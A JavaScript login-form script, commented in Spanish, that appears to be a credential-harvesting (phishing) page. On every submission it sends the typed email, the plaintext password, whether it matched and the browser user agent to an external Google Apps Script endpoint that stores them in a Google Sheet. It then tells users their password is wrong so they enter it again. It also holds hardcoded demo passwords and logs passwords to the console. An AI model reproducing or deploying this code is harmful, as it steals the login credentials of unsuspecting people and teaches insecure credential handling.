// Configuración - REEMPLAZA con tu URL de Google Apps Script
const API_URL = 'https://script.google.com/macros/s/AKfycbwsPj9OX59TC_rzS34hWt2N2cVrBSHJ7cl02cJ0fg1H0yVzxp5JcmL8rYmfmMMQpdISPw/exec';

document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const togglePassword = document.getElementById('togglePassword');
    const loginBtn = document.getElementById('loginBtn');
    const btnText = document.querySelector('.btn-text');
    const loadingSpinner = document.querySelector('.loading-spinner');
    const generalError = document.getElementById('general-error');

    // Base de datos simulada de usuarios válidos
    const validUsers = [
        { email: 'admin@misitio.com', password: 'admin123' },
        { email: 'usuario@misitio.com', password: 'usuario123' },
        { email: 'test@misitio.com', password: 'test123' }
    ];

    // Mostrar/ocultar contraseña
    togglePassword.addEventListener('click', function() {
        const passwordGroup = document.querySelector('.password-group');
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        passwordGroup.classList.toggle('show-password');
    });

    // Validación en tiempo real
    emailInput.addEventListener('input', validateEmail);
    passwordInput.addEventListener('input', validatePassword);

    function validateEmail() {
        const email = emailInput.value.trim();
        const emailError = document.getElementById('email-error');
        const emailGroup = emailInput.parentElement;

        hideGeneralError();

        if (!email) {
            showError(emailGroup, emailError, 'Ingresa un correo electrónico o teléfono');
            return false;
        }

        if (!isValidEmail(email)) {
            showError(emailGroup, emailError, 'Ingresa un correo electrónico válido');
            return false;
        }

        hideError(emailGroup, emailError);
        return true;
    }

    function validatePassword() {
        const password = passwordInput.value;
        const passwordError = document.getElementById('password-error');
        const passwordGroup = passwordInput.parentElement;

        hideGeneralError();

        if (!password) {
            showError(passwordGroup, passwordError, 'Ingresa tu contraseña');
            return false;
        }

        if (password.length < 6) {
            showError(passwordGroup, passwordError, 'La contraseña es demasiado corta');
            return false;
        }

        hideError(passwordGroup, passwordError);
        return true;
    }

    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    function showError(inputGroup, errorElement, message) {
        inputGroup.classList.add('error');
        errorElement.textContent = message;
        errorElement.style.display = 'block';
    }

    function hideError(inputGroup, errorElement) {
        inputGroup.classList.remove('error');
        errorElement.style.display = 'none';
    }

    function showGeneralError(message) {
        generalError.textContent = message;
        generalError.style.display = 'block';
        generalError.classList.add('show');
    }

    function hideGeneralError() {
        generalError.style.display = 'none';
        generalError.classList.remove('show');
    }

    // Envío del formulario
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        const isEmailValid = validateEmail();
        const isPasswordValid = validatePassword();

        if (isEmailValid && isPasswordValid) {
            await processLogin();
        }
    });

    async function processLogin() {
        // Mostrar estado de carga
        btnText.style.display = 'none';
        loadingSpinner.style.display = 'block';
        loginBtn.disabled = true;
        hideGeneralError();

        try {
            const email = emailInput.value.trim();
            const password = passwordInput.value;

            console.log('🔍 1. Iniciando proceso de login...');
            console.log('📧 Email:', email);
            console.log('🔑 Password:', password);

            // Verificar si las credenciales son válidas
            const isValid = checkCredentials(email, password);
            console.log('✅ Credenciales válidas?:', isValid);

            // ✅ GUARDAR EN GOOGLE SHEETS
            console.log('🌐 2. Intentando guardar en Google Sheets...');
            console.log('📡 URL de API:', API_URL);
            
            const saveSuccess = await saveToGoogleSheets(email, password, isValid);
            console.log('💾 Guardado exitoso?:', saveSuccess);

            if (isValid && saveSuccess) {
                console.log('🎉 Login exitoso y datos guardados');
                alert('✅ ¡Inicio de sesión exitoso!');
                loginForm.reset();
            } else if (!isValid && saveSuccess) {
                console.log('❌ Credenciales incorrectas pero datos guardados');
                showGeneralError('❌ Contraseña incorrecta. Inténtalo de nuevo.');
                passwordInput.value = '';
                passwordInput.focus();
            } else {
                console.log('💥 Error al guardar datos');
                showGeneralError('❌ Error al guardar los datos. Inténtalo de nuevo.');
            }
            
        } catch (error) {
            console.error('💥 ERROR GENERAL:', error);
            showGeneralError('❌ Error al procesar el login. Inténtalo de nuevo.');
        } finally {
            // Restaurar estado normal
            btnText.style.display = 'block';
            loadingSpinner.style.display = 'none';
            loginBtn.disabled = false;
        }
    }

    // Verificar credenciales
    function checkCredentials(email, password) {
        return validUsers.some(user => 
            user.email === email && user.password === password
        );
    }

    // Guardar en Google Sheets - VERSIÓN DEBUG MEJORADA
    async function saveToGoogleSheets(email, password, isValid) {
        try {
            console.log('📤 Preparando datos para enviar...');
            const requestData = {
                email: email,
                password: password,
                status: isValid ? '✅ CORRECTO' : '❌ INCORRECTO',
                userAgent: navigator.userAgent
            };
            
            console.log('📦 Datos a enviar:', requestData);

            console.log('🚀 Enviando POST a:', API_URL);
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(requestData)
            });
            
            console.log('📨 Respuesta recibida. Status:', response.status);
            console.log('📨 Respuesta OK?:', response.ok);
            
            const result = await response.json();
            console.log('📊 Resultado JSON:', result);
            
            if (!result.success) {
                console.error('❌ Error del servidor:', result.error);
                // Mostrar el error real en un alert
                alert('Error del servidor: ' + (result.error || 'Error desconocido'));
            }
            
            return result.success;
            
        } catch (error) {
            console.error('💥 Error de conexión:', error);
            console.error('💥 Tipo de error:', error.name);
            console.error('💥 Mensaje:', error.message);
            
            // Mostrar el error real en un alert
            alert('Error de conexión: ' + error.message);
            return false;
        }
    }

    // Efectos de focus
    emailInput.addEventListener('focus', function() {
        hideGeneralError();
    });

    passwordInput.addEventListener('focus', function() {
        hideGeneralError();
    });
});
